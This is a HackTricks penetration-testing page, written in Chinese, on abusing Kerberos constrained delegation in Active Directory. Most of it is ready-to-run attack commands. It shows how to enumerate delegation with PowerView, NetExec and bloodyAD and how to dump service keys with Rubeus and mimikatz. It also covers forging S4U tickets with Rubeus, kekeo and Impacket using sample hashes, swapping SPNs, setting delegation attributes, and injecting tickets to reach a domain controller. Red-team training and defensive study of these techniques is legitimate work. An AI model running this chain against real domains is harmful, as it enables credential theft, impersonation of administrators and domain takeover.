# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

使用此功能，域管理员可以**允许**一台计算机针对某台机器上的任意**服务**来**冒充用户或计算机**。

- **Service for User to self (_S4U2self_)：** 任何**拥有 SPN 的 service account**通常都可以代表任意用户获取指向自身的 TGS。如果该账户的 _userAccountControl_ 中还具有 [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)（T2A4D），则该 TGS 是**可转发的**，这正是 protocol transition 对 **classic constrained delegation** 直接有用的原因。
- **Service for User to Proxy(_S4U2proxy_)：** **service account** 可以代表用户，针对 **msDS-AllowedToDelegateTo** 中列出的 SPN 获取 TGS。S4U2Proxy 使用的 evidence ticket 必须是发往 delegation service 的**可转发**票据：可以是从受害者处捕获的真实 client-to-service 票据，也可以是使用 **S4U2Self + T2A4D** 生成的票据。

**注意**：如果用户在 AD 中被标记为“_Account is sensitive and cannot be delegated_”，或者是 **Protected Users** 的成员，通常将**无法通过 constrained delegation 冒充**该用户。在现代域中，针对启用了 delegation 的账户时，应优先使用 **AES** material，而不要仅假设使用 RC4。

这意味着，如果你**获取了 service 的 hash**，就可以**冒充用户**，并代表他们通过指定的机器访问任意**服务**（可能实现 **privesc**）。

此外，你**不仅可以访问该用户能够被冒充后访问的服务，还可以访问任意服务**，因为 SPN（请求的服务名称）不会被检查（在票据中，这部分没有被加密或签名）。因此，如果你可以访问 **CIFS service**，还可以使用 Rubeus 中的 `/altservice` flag 访问 **HOST service**。相同的 SPN swapping weakness 也被 **Impacket getST -altservice** 及其他工具利用。

另外，**DC 上的 LDAP service access** 正是利用 **DCSync** 所需的条件。
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Operator note:** 不要仅凭 **ADUC** 或 BloodHound 截图来审查 **gMSA/sMSA**。这些账户通常会隐藏常见的 Delegation 选项卡，因此请直接枚举原始的 **`userAccountControl`** 和 **`msDS-AllowedToDelegateTo`** 属性。
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition 与 Kerberos-only constrained delegation

如果被入侵的账户具有 **T2A4D**，通常只需服务密钥/TGT 即可完成完整的 **`S4U2Self -> S4U2Proxy`** 链。

如果它只有 **`msDS-AllowedToDelegateTo`**（经典的 **"Use Kerberos only"** 模式），delegation 仍然可能被滥用，但用于 S4U2Proxy 的 evidence ticket 必须是针对 delegation 服务的**真实、可转发的用户到服务 ticket**。实际上，这意味着需要从 **LSASS/ccache** 窃取或捕获 victim TGS，并将其传入第二阶段（Rubeus 中使用 `/tgs:`）。对于经典 constrained delegation，**不可转发的** S4U2Self ticket **不够用**；如果这是你唯一的 evidence ticket，请改为检查 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)。

### 跨域 constrained delegation 注意事项（2025+）

从 **Windows Server 2012/2012 R2** 开始，KDC 通过 S4U2Proxy extensions 支持跨域/跨 forest 的 constrained delegation。现代版本（Windows Server 2016–2025）保留了这一行为，并添加了两个 PAC SIDs 来表示 protocol transition：

- `S-1-18-1`（**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**）：用户正常完成身份验证时使用。
- `S-1-18-2`（**SERVICE_ASSERTED_IDENTITY**）：服务通过 protocol transition 断言该身份时使用。

当跨域使用 protocol transition 时，预期 PAC 中会包含 `SERVICE_ASSERTED_IDENTITY`，这表明 S4U2Proxy 步骤已成功。

### Impacket / Linux 工具（altservice 与完整 S4U）

近期版本的 Impacket（0.11.x+）像 Rubeus 一样，提供相同的 S4U 链和 SPN swapping：
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
如果你更倾向于先伪造用户 ST（例如仅持有 offline hash），可以将 **ticketer.py** 与 **getST.py** 搭配用于 S4U2Proxy。如果你已经拥有可用的 ccache，只需为同一主机替换 service class，那么 **tgssub.py** 也很方便。有关当前存在的问题（当伪造的 ST 与 SPN key 不匹配时出现 KRB_AP_ERR_MODIFIED），请参阅公开的 Impacket issue #1713。

### 从低权限凭据自动化配置 delegation

如果你已经对某个 computer 或 service account 拥有 **GenericAll/WriteDACL**，则可以使用 **bloodyAD**（2024+）远程推送所需属性，而无需 RSAT：
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
这让你只要能够写入这些属性，就可以在没有 DA 权限的情况下构建用于 privesc 的 constrained delegation 路径。

- Step 1: **获取允许服务的 TGT**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> 还有**其他获取 TGT ticket 的方式**，或者在计算机上不成为 SYSTEM 即可获取 **RC4** 或 **AES256**，例如 Printer Bug 和 unconstrain delegation、NTLM relaying 以及 Active Directory Certificate Service abuse
>
> **仅凭该 TGT ticket（或其 hash），你就可以执行此攻击，而无需 compromise 整台计算机。**

- Step2: **获取用于冒充该用户的 service 的 TGS**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**在 ired.team 获取更多信息。**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) 和 [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## 参考资料
- [Kerberos Constrained Delegation 概述（Microsoft Learn，2025）](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [使用 Impacket 滥用 Delegation（第 2 部分）：Constrained Delegation（Black Hills，2025）](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)

{{#include ../../banners/hacktricks-training.md}}
